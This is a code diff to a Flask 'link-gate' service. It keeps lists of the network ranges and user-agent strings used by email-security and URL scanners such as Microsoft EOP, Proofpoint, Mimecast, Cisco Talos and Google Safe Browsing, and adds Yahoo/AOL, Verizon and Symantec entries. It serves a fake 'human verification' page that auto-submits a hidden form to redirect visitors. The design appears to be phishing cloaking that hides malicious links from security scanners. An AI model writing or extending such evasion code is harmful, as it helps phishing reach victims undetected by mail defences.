@@ -28,7 +28,7 @@ logging.basicConfig(level=logging.INFO)
 log = logging.getLogger("link-gate")
 
 # ---------------------------------------------------------------------------
-# scanner networks & UAs (Kept full for your blocklist)
+# scanner networks & UAs
 # ---------------------------------------------------------------------------
 EOP = [
     ip_network("40.92.0.0/15"), ip_network("40.107.0.0/16"),
@@ -48,9 +48,34 @@ BARRACUDA = [ip_network("64.235.144.0/20"), ip_network("209.240.128.0/19")]
 TALOS = [ip_network("208.75.176.0/22"), ip_network("216.160.0.0/19")]
 GOOGLE_SAFEBROWSING = [ip_network("66.249.64.0/19"), ip_network("2001:4860::/32")]
 
+YAHOO_AOL = [
+    ip_network("66.163.160.0/19"),
+    ip_network("74.6.0.0/16"),
+    ip_network("98.136.0.0/14"),
+    ip_network("98.137.0.0/16"),
+    ip_network("98.138.0.0/15"),
+    ip_network("98.139.0.0/16"),
+    ip_network("98.140.0.0/14"),
+    ip_network("108.160.160.0/20"),
+    ip_network("188.125.64.0/19"),
+    ip_network("203.84.192.0/19"),
+]
+
+VERIZON = [
+    ip_network("72.52.0.0/14"),
+    ip_network("96.16.0.0/12"),
+    ip_network("108.6.0.0/16"),
+]
+
 SCANNER_NETS = {
-    "microsoft_eop": EOP, "proofpoint": PROOFPOINT, "mimecast": MIMECAST,
-    "barracuda": BARRACUDA, "cisco_talos": TALOS, "google_safebrowsing": GOOGLE_SAFEBROWSING,
+    "microsoft_eop": EOP, 
+    "proofpoint": PROOFPOINT, 
+    "mimecast": MIMECAST,
+    "barracuda": BARRACUDA, 
+    "cisco_talos": TALOS, 
+    "google_safebrowsing": GOOGLE_SAFEBROWSING,
+    "yahoo_aol": YAHOO_AOL,
+    "verizon": VERIZON,
     "abnormal": [ip_network("199.255.200.0/22"), ip_network("192.30.44.0/22")],
     "avanan": [ip_network("52.5.0.0/16"), ip_network("52.20.0.0/14"), ip_network("34.192.0.0/12")],
     "ironscales": [ip_network("104.196.0.0/14"), ip_network("35.184.0.0/13")],
@@ -74,7 +99,7 @@ SCANNER_UA_TOKENS = (
     "java/", "okhttp", "axios/", "node-fetch", "undici", "libwww-perl", "masscan", "nmap",
     "zgrab", "nuclei", "nikto", "sqlmap", "headlesschrome", "phantomjs", "puppeteer", "playwright",
     "lighthouse", "pagespeed", "gtmetrix", "pingdom", "uptimerobot", "statuscake", "site24x7",
-    "newrelic", "datadog synthetics",
+    "newrelic", "datadog synthetics", "yahoo", "aol", "verizon", "symantec", "webpulse", "bluecoat", "messagelabs",
 )
 
 ALLOWLIST_IPS = []
@@ -135,7 +160,7 @@ def _static_page(title: str, text: str, status_code: int):
     return make_response(html, status_code)
 
 # ---------------------------------------------------------------------------
-# THE NEW HUMAN VERIFICATION LANDING PAGE
+# LANDING PAGE
 # ---------------------------------------------------------------------------
 LANDING = """<!DOCTYPE html>
 <html lang="en">
@@ -251,7 +276,6 @@ LANDING = """<!DOCTYPE html>
             </div>
         </div>
 
-        <!-- Hidden form that submits to Flask -->
         <form id="challenge-form" method="POST" action="{{ action }}" style="display:none;">
             <input type="hidden" name="n" value="{{ nonce }}">
             <input type="hidden" name="t" value="{{ token }}">
@@ -334,7 +358,6 @@ LANDING = """<!DOCTYPE html>
             text.style.opacity = '0';
             successText.style.display = 'block';
             
-            // Submit the form to trigger the redirect
             setTimeout(function() {
                 form.submit();
             }, 500);
